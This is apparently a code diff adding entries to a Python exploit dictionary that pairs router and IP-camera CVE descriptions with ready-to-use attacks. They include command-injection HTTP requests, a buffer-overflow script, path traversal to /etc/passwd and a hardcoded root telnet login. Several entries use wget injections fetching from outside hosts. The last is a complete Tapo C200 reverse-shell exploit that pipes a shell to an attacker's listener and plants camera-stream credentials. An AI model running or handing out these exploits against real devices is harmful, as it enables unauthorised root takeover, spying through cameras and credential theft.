@@ -2721,3 +2721,170 @@ tftp -g 192.168.0.100 -r busybox -l /tmp/busybox;chmod +x /tmp/busybox;/tmp/busy
  """
  ]
 }
+
+model_exp_dic["TP-Link_Archer_AX21"] = {
+    "":
+["TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 contained a command injection vulnerability in the country form of the /cgi-bin/luci;stok=/locale endpoint on the web management interface. Specifically, the country parameter of the write operation was not sanitized before being used in a call to popen(), allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.\n['https://www.tenable.com/security/research/tra-2023-11']",
+ """
+#Sending a request similar to the following twice in a row would run the $(id>/tmp/out) command on the second request, creating the /tmp/out file containing the output of the id command. 
+POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
+Host: <target router>
+Content-Type: application/x-www-form-urlencoded
+
+operation=write&country=$(id>/tmp/out)
+ """
+ ]
+}
+
+model_exp_dic["TRENDnet_TEW-755AP"] = {
+    "CVE-2022-46596":
+["TRENDnet TEW755AP 1.13B01 was discovered to contain a stack overflow via the del_num parameter in the icp_delete_img (sub_41DEDC) function.\n['https://brief-nymphea-813.notion.site/Vul6-TEW755-bof-icp_delete_img-ed2df4b6b4f74520bda8adead2d0d651']",
+ """
+import requests
+url = "http://192.168.17.221:80/apply.cgi"
+cookie = {"Cookie":"uid=1234"}
+data = { 
+    'action' : "icp_delete_img",
+    "del_num" : "a" * 0x1000
+}
+response = requests.post(url, cookies=cookie, data=data)
+print(response.text)
+print(response)
+ """
+ ]
+}
+
+
+model_exp_dic["Hongdian_H8922"] = {
+    "CVE-2021-28149":
+["Hongdian H8922 3.0.5 devices allow Directory Traversal. The /log_download.cgi log export handler does not validate user input and allows a remote attacker with minimal privileges to download any file from the device by substituting ../ (e.g., ../../etc/passwd) This can be carried out with a web browser by changing the file name accordingly. Upon visiting log_download.cgi?type=../../etc/passwd and logging in, the web server will allow a download of the contents of the /etc/passwd file\n['http://en.hongdian.com/Products/Details/H8922'\n'https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/']",
+ """
+ http://[ip]/log_download.cgi?type=../../etc/passwd
+ """
+ ],
+    "CVE-2021-28150":
+["Hongdian H8922 3.0.5 devices allow the unprivileged guest user to read cli.conf (with the administrator password and other sensitive data) via /backup2.cgi.\n['http://en.hongdian.com/Products/Details/H8922\nhttps://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/']",
+ """
+ #username guest password guest
+ #leak admin password
+ http://173.182.71.235/backup2.cgi
+ """
+ ],
+    "CVE-2021-28151":
+["Hongdian H8922 3.0.5 devices allow OS command injection via shell metacharacters into the ip-address (aka Destination) field to the tools.cgi ping command, which is accessible with the username guest and password guest.",
+ """
+ system->netwrok
+ ps;
+ """
+ ],
+    "CVE-2021-28152":
+["Hongdian H8922 3.0.5 devices have an undocumented feature that allows access to a shell as a superuser. To connect, the telnet service is used on port 5188 with the default credentials of root:superzxmn.",
+ """
+ telnet ip 5188
+ username: root
+ password: superzxmn
+ """
+ ]
+}
+
+model_exp_dic["DIR-866L"] = {
+    "CVE-2019-16920":
+["Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.\n['https://www.seebug.org/vuldb/ssvid-98079\nhttps://www.kb.cert.org/vuls/id/766427\nhttps://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3'],",
+ """
+#unauth rce
+POST /apply_sec.cgi HTTP/1.1
+Host: 192.168.232.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+Connection: close
+Referer: http://192.168.232.128/login_pic.asp
+Cookie: uid=1234123
+Upgrade-Insecure-Requests: 1
+html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
+ """
+ ]
+}
+
+
+model_exp_dic["DIR-862L"] = {
+    "CVE-2019-16920":
+["Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.\n['https://www.seebug.org/vuldb/ssvid-98079\nhttps://www.kb.cert.org/vuls/id/766427\nhttps://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3'],",
+ """
+#unauth rce
+POST /apply_sec.cgi HTTP/1.1
+Host: 192.168.232.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+Connection: close
+Referer: http://192.168.232.128/login_pic.asp
+Cookie: uid=1234123
+Upgrade-Insecure-Requests: 1
+html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
+ """
+ ]
+}
+
+
+model_exp_dic["TOTOLINK_A3000RU"] = {
+    "TOTOLINK_A3000RU_downloadFlile_rce":
+    ["TOTOLINK_A300RU unauth rce vuln",
+"""
+GET /cgi-bin/downloadFlile.cgi?;wget${IFS}http://192.168.0.111:801/mm.txt;=hahah HTTP/1.1
+"""
+     ]
+}
+
+model_exp_dic["TP-Link_Tapo_c200"] = {
+    "CVE-2021-4045":
+        ["TP-Link Tapo C200 IP camera, on its 1.1.15 firmware version and below, is affected by an unauthenticated RCE vulnerability, present in the uhttpd binary running by default as root. The exploitation of this vulnerability allows an attacker to take full control of the camera.\n['http://packetstormsecurity.com/files/168472/TP-Link-Tapo-c200-1.1.15-Remote-Code-Execution.html'\n'https://www.incibe-cert.es/en/early-warning/security-advisories/tp-link-tapo-c200-remote-code-execution-vulnerability']",
+"""
+#python3 pwntapo.py shell 192.168.1.79 192.168.1.41
+import requests, urllib3, sys, threading, os, hashlib
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+PORT = 1337
+REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
+NC_COMMAND = 'nc -lv %d' % PORT
+
+RTSP_USER = 'pwned1337'
+RTSP_PASSWORD = 'pwned1337'
+RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='
+
+if (len(sys.argv) < 4) or (sys.argv[1] != 'shell' and sys.argv[1] != 'rtsp'):
+    print("[x] Usage: python3 pwnTapo.py [shell|rtsp] [victim_ip] [attacker_ip]")
+    print()
+    exit()
+
+victim = sys.argv[2]
+attacker = sys.argv[3]
+url = "https://" + victim + ":443/"
+
+if sys.argv[1] == 'shell':
+    print("[+] Listening on port %d..." % PORT)
+    t = threading.Thread(target=os.system, args=(NC_COMMAND,))
+    t.start()
+
+    print("[+] Sending reverse shell to %s...\n" % victim)
+    json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
+    requests.post(url, json=json, verify=False)
+
+elif sys.argv[1] == 'rtsp':
+    print("[+] Setting up RTSP video stream...")
+    md5_rtsp_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
+    json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_rtsp_password, RTSP_CIPHERTEXT)}}
+    requests.post(url, json=json, verify=False)
+
+    print("[+] RTSP video stream available at rtsp://%s/stream2" % victim)
+    print("[+] RTSP username: %s" % RTSP_USER)
+    print("[+] RTSP password: %s" % RTSP_PASSWORD)
+"""
+         ]
+}
